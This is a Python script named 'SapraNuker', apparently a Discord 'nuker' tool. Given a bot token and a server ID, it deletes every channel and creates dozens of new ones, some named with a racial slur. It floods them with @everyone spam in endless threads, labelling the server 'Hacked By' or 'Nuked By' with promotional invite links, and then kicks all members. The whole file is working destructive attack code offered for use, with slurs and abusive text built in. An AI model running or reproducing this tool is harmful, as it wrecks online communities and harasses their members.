from os import system
def print_logo():
    system("cls || clear")
    print("""
     ____                        _   _       _             
    / ___|  __ _ _ __  _ __ __ _| \ | |_   _| | _____ _ __ 
    \___ \ / _` | '_ \| '__/ _` |  \| | | | | |/ / _ \ '__|
     ___) | (_| | |_) | | | (_| | |\  | |_| |   <  __/ |   
    |____/ \__,_| .__/|_|  \__,_|_| \_|\__,_|_|\_\___|_|   
                |_|                                        
                   Made by dev.milk#0
    """)
print_logo()
try: 
    import requests
    import time
    import threading
    import random
    import discord
    from discord.ext import commands
except:
    
    print("Required modules not found, installing them...")
    system("python -m pip install requests")
    system("python -m pip install discord")
    system("cls || clear")
    print("All modules installed, please restart the script.")
    input("Press enter to restart...")
print_logo()
# All parameters 
TOKEN = input("Please enter bot token: ")
LINK = 'https://discord.gg/Cq4xmBmJYx https://discord.gg/scansquad https://discord.gg/TeVuydgwRk NSIS x ScanSquad x TeamSync'
COMMAND_PREFIX = '!'
MESSAGES = [
    '@everyone Hacked By ' +LINK,
    '@everyone Fucked By ' +LINK,
    '@everyone Owned By '  +LINK,
    '@everyone Nuked By '   +LINK
]
CHANNEL_NAMES = [
    'Hacked',
    'Fucked',
    'Nuked',
    'Nigger'
]
GUILD = int(input("Enter guild id: "))



headers = {'authorization': f'Bot {TOKEN}'}


def get_all_channels():
    while True:
        r = requests.get(f"https://discord.com/api/v10/guilds/{GUILD}/channels", headers=headers)
        if 'retry_after' in r.text:
            time.sleep(r.json()['retry_after'])
        else:
            if r.status_code in [200, 201, 204]:
                return r.json()
            else:
                return

def remove_channel(chnl):
    strike = 0
    while True:
        r = requests.delete(f"https://discord.com/api/v10/channels/{chnl}", headers=headers)
        if 'retry_after' in r.text:
            time.sleep(r.json()['retry_after'])
        else:
            if r.status_code in [200, 201, 204]:
                print(f"[Success] Removed channel: {chnl}")
                return
            else:
                print(f"[Fail] Cannot remove channel. Status: {r.status_code}. Retrying... Current strike: {strike}")
                strike+=1
                if strike > 3:
                    print("[Srike] Strike limit has been reached. Quiting thread.")
                    return
    
def channel(name):
    while True:
        json = {'name': name, 'type': 0}
        r = requests.post(f'https://discord.com/api/v10/guilds/{GUILD}/channels', headers=headers, json=json)
        if 'retry_after' in r.text:
            time.sleep(r.json()['retry_after'])
        else:
            if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                id = r.json()["id"]
                print(f"[Success] Created a channel with name: {name} ID: {id}")
                threading.Thread(target=send_message, args=(id,)).start()
                return
            else:
                continue
def send_message(id):
    while True:
        json = {'content': random.choice(MESSAGES)}
        r = requests.post(f'https://discord.com/api/v10/channels/{id}/messages', headers=headers, json=json)
        if 'retry_after' in r.text:
            time.sleep(r.json()['retry_after'])
def kick_member(id):
    r = requests.delete(f'https://discord.com/api/v10/guilds/{GUILD}/members/{id}', headers=headers)

# Check if the request was successful
    if r.status_code == 204:
        print(f'[Success] Kicked {id} successfully!')
    else:
        print(f'Failed to kick member. Status code: {r.status_code}, Response: {r.text}')

def remove_channels():
    for channel_id in channel_ids:
        threading.Thread(target=remove_channel, args=(channel_id,)).start()
        print("[Thread] Created thread for removing channels")

def spam_channels(CHANNEL_NAME):
    for i in range(20):
        channel(f"{CHANNEL_NAME}")

channel_ids = [channel['id'] for channel in get_all_channels()]
if len(channel_ids) != 0:
    remove_channels()
else:
    print("No channels found.")
for _ in range(50):
    threading.Thread(target=channel, args=(random.choice(CHANNEL_NAMES),)).start()
    print("[Thread] Created thread for creating channels")


def kick():
    intents = discord.Intents.all()
    intents.members = True

    bot = commands.Bot(command_prefix='!', intents=intents)
    @bot.event
    async def on_ready():
        print(f'Logged in as {bot.user.name}')
        await kick_all_members()

    async def kick_all_members():
        i = 0
        k = 0
        guild_id = GUILD  # Replace with your actual guild ID
        guild = bot.get_guild(guild_id)
        if guild:
            for member in guild.members:
                try:
                    
                    await member.kick(reason="Kicked all members")
                    print(f'[Success] Kicked: {member.name}#{member.discriminator}')
                    i += 1
                except discord.Forbidden:
                    k += 1
                    print(f'[Fail] Can\'t kick: {member.name}#{member.discriminator} (Permission Denied)')
            print(f"[Info] Member kick loop finished, kicked: {i}, failed: {k}, total: {i+k}")
        else:
            print(f'Guild not found.')


    bot.run(TOKEN)

time.sleep(5)
kick()